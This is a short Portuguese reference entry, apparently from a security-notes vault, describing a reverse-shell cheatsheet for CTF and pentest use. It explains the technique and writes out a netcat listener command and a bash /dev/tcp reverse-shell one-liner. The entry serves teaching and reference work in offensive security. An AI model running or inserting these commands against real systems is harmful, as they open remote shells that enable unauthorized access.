---
titulo: "Cheatsheet de Reverse Shells"
tipo: cheatsheet
nome: "Cheatsheet de Reverse Shells"
categoria: "Fundamentos/Cheatsheets"
subcategoria: "Referência Rápida"
plataformas: ["Linux", "Windows"]
licenca: "N/A (referência)"
linguagem: "N/A"
mitre_attack: ["T1059"]
nivel: intermediario
situacao: ativo
link_oficial: "https://revshells.com/"
tags:
  - ciberseguranca
  - cheatsheet
  - fundamentos
  - arsenal-de-ferramentas
---

# Cheatsheet de Reverse Shells

> Coleção de referência rápida de comandos one-liner para estabelecer um shell reverso em diferentes linguagens/interpretadores disponíveis em um host comprometido.

## Como funciona
Cada entrada da cheatsheet é um comando específico (Bash, Python, PowerShell, Netcat, PHP, etc.) que, executado no host alvo, conecta de volta a um listener na máquina do operador e entrega um shell interativo, escolhido conforme qual interpretador/linguagem já está disponível no sistema comprometido naquele momento.

## Como usar
Prepara-se um listener na máquina do operador (`nc -lvnp 4444`) e executa-se, no host alvo (via uma vulnerabilidade já explorada), o one-liner correspondente à linguagem disponível (ex.: `bash -i >& /dev/tcp/IP/4444 0>&1`), recebendo o shell interativo no listener.

## Casos de uso
- Obtenção de shell interativo após exploração bem-sucedida
- Referência rápida durante CTFs/pentests para diferentes ambientes alvo

## Alternativas
[[Cheatsheet de Pivoting-Tunneling|Cheatsheet de Pivoting/Tunneling]]

## Categoria
[[MOC - Cheatsheets]]

## Link oficial
https://revshells.com/
